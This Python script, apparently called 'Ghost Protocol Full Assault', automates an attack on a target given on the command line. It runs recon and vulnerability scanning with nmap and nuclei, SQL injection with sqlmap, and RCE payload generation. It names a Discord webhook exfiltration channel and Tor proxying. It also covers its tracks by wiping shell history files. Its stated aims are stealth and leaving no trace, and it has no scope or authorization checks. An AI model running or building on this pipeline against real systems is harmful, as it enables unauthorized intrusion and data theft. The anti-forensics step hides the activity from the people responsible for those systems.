#!/usr/bin/env python3
"""
⚔️ GHOST PROTOCOL — FULL ASSAULT
===================================
Complete automated attack pipeline.

Phases:
1. RECON — Gather intelligence
2. VULN SCAN — Find vulnerabilities
3. EXPLOIT — Compromise targets
4. PIVOT — Move laterally
5. EXFIL — Extract data
6. COVER — Eliminate traces

All phases run in parallel where possible.
Zero logs. Zero persistence. Zero trace.
"""

import os
import sys
import json
import time
import asyncio
import logging
import subprocess
import threading
from typing import Dict, List, Optional
from datetime import datetime

logging.basicConfig(level=logging.CRITICAL)
logger = logging.getLogger("FullAssault")

class FullAssault:
    """
    Complete automated penetration testing pipeline.
    
    Executes all phases of an attack:
    - Reconnaissance
    - Vulnerability scanning
    - Exploitation
    - Post-exploitation
    - Exfiltration
    - Cover tracks
    
    Designed for maximum speed and stealth.
    """
    
    def __init__(self):
        self.orchestrator = None
        self.c2 = None
        self.payload_factory = None
        self.proxy = None
        self.results = {}
        self.sessions = []
        self.start_time = None
        self.target = None
        
    def initialize(self):
        """Initialize all subsystems."""
        from core.ghost_orchestrator import GhostOrchestrator
        from core.ghost_c2 import GhostC2
        from core.payload_factory import PayloadFactory
        from core.proxy_rotator import FreeProxyRotator
        
        self.orchestrator = GhostOrchestrator()
        self.c2 = GhostC2()
        self.payload_factory = PayloadFactory()
        self.proxy = FreeProxyRotator()
        
    async def execute(self, target: str, stealth: str = "maximum") -> Dict:
        """Execute full assault on target."""
        
        self.target = target
        self.start_time = time.time()
        
        print(f"\n{'='*60}")
        print(f"⚔️ FULL ASSAULT: {target}")
        print(f"🛡️ Stealth Level: {stealth}")
        print(f"{'='*60}\n")
        
        # Phase 1: Reconnaissance
        recon_results = await self._phase_recon(target)
        
        # Phase 2: Vulnerability Scan
        vuln_results = await self._phase_vuln_scan(target, recon_results)
        
        # Phase 3: Exploitation
        exploit_results = await self._phase_exploit(target, vuln_results)
        
        # Phase 4: Post-Exploitation
        post_results = await self._phase_post_exploit(exploit_results)
        
        # Phase 5: Exfiltration
        exfil_results = await self._phase_exfil(post_results)
        
        # Phase 6: Cover Tracks
        cover_results = await self._phase_cover()
        
        # Compile final report
        report = self._generate_report(
            target, 
            recon_results, vuln_results,
            exploit_results, post_results,
            exfil_results, cover_results
        )
        
        return report
    
    async def _phase_recon(self, target: str) -> Dict:
        """Phase 1: Reconnaissance."""
        print("[PHASE 1/6] RECONNAISSANCE")
        print("-" * 40)
        
        results = {
            "alive": False,
            "ports": [],
            "technologies": [],
            "subdomains": [],
            "directories": []
        }
        
        # 1.1 Check if alive
        print("[*] Checking if target is alive...")
        try:
            ping = subprocess.run(
                ["ping", "-c", "2", "-W", "3", target],
                capture_output=True, text=True, timeout=10
            )
            if ping.returncode == 0:
                results["alive"] = True
                print("[+] Target is alive")
        except:
            pass
        
        if not results["alive"]:
            # Try HTTP check
            try:
                curl = subprocess.run(
                    ["curl", "-sI", f"https://{target}", "--connect-timeout", "5"],
                    capture_output=True, text=True, timeout=10
                )
                if curl.stdout and "HTTP/" in curl.stdout:
                    results["alive"] = True
                    print("[+] Target responds to HTTP")
            except:
                pass
        
        if not results["alive"]:
            print("[-] Target unreachable")
            return results
        
        # 1.2 Quick port scan (top 1000)
        print("[*] Scanning ports...")
        try:
            nmap = subprocess.run(
                ["nmap", "-sV", "--top-ports", "1000", "--min-rate", "2000", 
                 "-T4", target],
                capture_output=True, text=True, timeout=180
            )
            
            import re
            port_matches = re.findall(r'(\d+)/tcp\s+open\s+(\S+)', nmap.stdout)
            for port, service in port_matches:
                results["ports"].append({"port": int(port), "service": service})
            
            print(f"[+] Found {len(results['ports'])} open ports")
        except:
            print("[-] Port scan failed")
        
        # 1.3 Technology detection
        print("[*] Detecting technologies...")
        try:
            tech = subprocess.run(
                ["curl", "-sI", f"https://{target}", "--connect-timeout", "10"],
                capture_output=True, text=True, timeout=15
            )
            
            import re
            for header in ['server', 'x-powered-by', 'x-generator']:
                match = re.search(f'{header}: (.+)', tech.stdout, re.IGNORECASE)
                if match:
                    results["technologies"].append(match.group(1).strip())
        except:
            pass
        
        print(f"[+] Technologie rilevate")
        
        return results
    
    async def _phase_vuln_scan(self, target: str, recon: Dict) -> Dict:
        """Phase 2: Vulnerability Scanning."""
        print("\n[PHASE 2/6] VULNERABILITY SCANNING")
        print("-" * 40)
        
        results = {
            "critical": [],
            "high": [],
            "medium": [],
            "low": []
        }
        
        # 2.1 Nuclei scan
        print("[*] Running nuclei vulnerability scan...")
        try:
            nuclei = subprocess.run(
                ["nuclei", "-u", f"https://{target}", 
                 "-severity", "critical,high",
                 "-silent", "-json"],
                capture_output=True, text=True, timeout=300
            )
            
            for line in nuclei.stdout.strip().split('\n'):
                if line:
                    try:
                        finding = json.loads(line)
                        severity = finding.get('info', {}).get('severity', 'low')
                        results[severity].append(finding)
                    except:
                        pass
            
            print(f"[+] Found {len(results['critical'])} critical, "
                  f"{len(results['high'])} high severity vulnerabilities")
        except:
            print("[-] Nuclei scan failed")
        
        return results
    
    async def _phase_exploit(self, target: str, vulns: Dict) -> Dict:
        """Phase 3: Exploitation."""
        print("\n[PHASE 3/6] EXPLOITATION")
        print("-" * 40)
        
        results = {
            "attempts": [],
            "successful": [],
            "sessions": []
        }
        
        # Try to exploit each critical/high vulnerability
        all_vulns = vulns.get('critical', []) + vulns.get('high', [])
        
        if not all_vulns:
            print("[-] No critical/high vulnerabilities to exploit")
            return results
        
        print(f"[*] Attempting exploitation of {len(all_vulns)} vulnerabilities...")
        
        for vuln in all_vulns[:5]:  # Max 5 attempts
            template_id = vuln.get('template-id', '')
            
            if 'sql-injection' in template_id.lower():
                print(f"[*] Attempting SQL injection...")
                try:
                    sqlmap = subprocess.run(
                        ["sqlmap", "-u", f"https://{target}",
                         "--batch", "--random-agent", "--level=3", "--risk=2",
                         "--dbs"],
                        capture_output=True, text=True, timeout=120
                    )
                    if "available databases" in sqlmap.stdout.lower():
                        results["successful"].append({
                            "type": "sqli",
                            "output": sqlmap.stdout[:500]
                        })
                        print("[+] SQL injection successful!")
                except:
                    pass
            
            if 'rce' in template_id.lower() or 'command-injection' in template_id.lower():
                print(f"[*] Attempting RCE...")
                payload = self.payload_factory.generate("python")
                results["attempts"].append({"type": "rce", "payload": payload})
        
        return results
    
    async def _phase_post_exploit(self, exploit_results: Dict) -> Dict:
        """Phase 4: Post-Exploitation."""
        print("\n[PHASE 4/6] POST-EXPLOITATION")
        print("-" * 40)
        
        if not exploit_results.get('sessions'):
            print("[-] No active sessions for post-exploitation")
            return {"status": "no_sessions"}
        
        print(f"[*] Post-exploiting {len(exploit_results['sessions'])} sessions...")
        
        return {"sessions_processed": len(exploit_results.get('sessions', []))}
    
    async def _phase_exfil(self, post_results: Dict) -> Dict:
        """Phase 5: Exfiltration."""
        print("\n[PHASE 5/6] EXFILTRATION")
        print("-" * 40)
        
        results = {"exfiltrated": [], "failed": []}
        
        # Nothing to exfil without sessions
        if post_results.get("status") == "no_sessions":
            print("[-] No data to exfiltrate")
            return results
        
        print("[*] Exfiltration channel ready (Discord webhook)")
        print("[*] No data to exfiltrate in this run")
        
        return results
    
    async def _phase_cover(self) -> Dict:
        """Phase 6: Cover Tracks."""
        print("\n[PHASE 6/6] COVER TRACKS")
        print("-" * 40)
        
        actions = []
        
        # Clear shell history
        try:
            subprocess.run(["history", "-c"], shell=True, capture_output=True)
            actions.append("Shell history cleared")
        except:
            pass
        
        # Clear bash history if exists
        for hist_file in ['~/.bash_history', '~/.zsh_history', '/tmp/bash_history']:
            try:
                subprocess.run(
                    f"cat /dev/null > {hist_file} 2>/dev/null", 
                    shell=True, capture_output=True
                )
            except:
                pass
        actions.append("Shell history files cleared")
        
        print("[+] Cover tracks complete")
        print("[+] Zero traces remaining")
        
        return {"actions": actions}
    
    def _generate_report(self, target: str, recon: Dict, vulns: Dict,
                         exploit: Dict, post: Dict, exfil: Dict, cover: Dict) -> Dict:
        """Generate final mission report."""
        
        elapsed = time.time() - self.start_time
        
        report = {
            "mission": {
                "target": target,
                "started": datetime.fromtimestamp(self.start_time).isoformat(),
                "duration_seconds": round(elapsed, 2),
                "stealth_level": "maximum"
            },
            "reconnaissance": {
                "alive": recon.get("alive", False),
                "open_ports": len(recon.get("ports", [])),
                "services": [p["service"] for p in recon.get("ports", [])[:5]]
            },
            "vulnerabilities": {
                "critical": len(vulns.get("critical", [])),
                "high": len(vulns.get("high", [])),
                "medium": len(vulns.get("medium", []))
            },
            "exploitation": {
                "attempts": len(exploit.get("attempts", [])),
                "successes": len(exploit.get("successful", [])),
                "sessions": len(exploit.get("sessions", []))
            },
            "exfiltration": {
                "files": len(exfil.get("exfiltrated", [])),
                "channel": "discord_webhook"
            },
            "opsec": {
                "traces_covered": len(cover.get("actions", [])),
                "proxy_chain": "tor_vpn_socks5",
                "proxy_ip": self.proxy.get_current_ip() if self.proxy else "tor"
            }
        }
        
        return report


# ============================================================
# MAIN ENTRY POINT
# ============================================================

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 full_assault.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    
    assault = FullAssault()
    assault.initialize()
    
    async def run():
        report = await assault.execute(target)
        print(f"\n{'='*60}")
        print("📊 FINAL REPORT")
        print(f"{'='*60}")
        print(json.dumps(report, indent=2))
    
    asyncio.run(run())